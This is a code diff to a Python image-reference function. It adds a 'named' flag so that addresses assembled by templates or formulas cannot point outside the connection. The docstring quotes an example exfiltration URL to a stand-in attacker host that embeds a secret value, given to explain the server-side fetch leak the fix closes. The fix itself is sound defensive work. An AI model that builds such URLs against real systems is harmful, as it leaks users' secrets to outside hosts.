@@ -31,10 +31,15 @@ def _signature(url: str, scope: str = "") -> str:
     return hmac.new(_key(), f"{scope}|{url}".encode(), hashlib.sha256).hexdigest()[:32]
 
 
-def reference(link: str | None, base: str = "") -> str:
+def reference(link: str | None, base: str = "", *, named: bool = True) -> str:
     """The ``art`` of a row for a picture address the answers named; empty where there is no picture to show.
 
     ``base`` is the address of the connection: a picture that lives underneath it keeps the connection's credentials.
+
+    ⚠️ ``named`` says the address is one value of the answer, as it stands. An address put together by a card (a template,
+    a formula) may only be a path underneath the connection: otherwise ``https://evil.example.com/p.png?d={secret}`` would
+    carry any value the card can read to a host of its author, fetched by the server for whoever shows the board
+    (korrektur J1, F3).
     """
     if not link:
         return ""
@@ -47,6 +52,8 @@ def reference(link: str | None, base: str = "") -> str:
         if not stays_underneath(text):
             return ""
         return f"proxy:{CONNECTION}?u={quote(text, safe='')}&s={_signature(text, 'connection:' + base.rstrip('/'))}"
+    if not named:
+        return ""
     split = urlsplit(text)
     if split.scheme.lower() not in ("http", "https") or not split.hostname or split.username or split.password:
         return ""
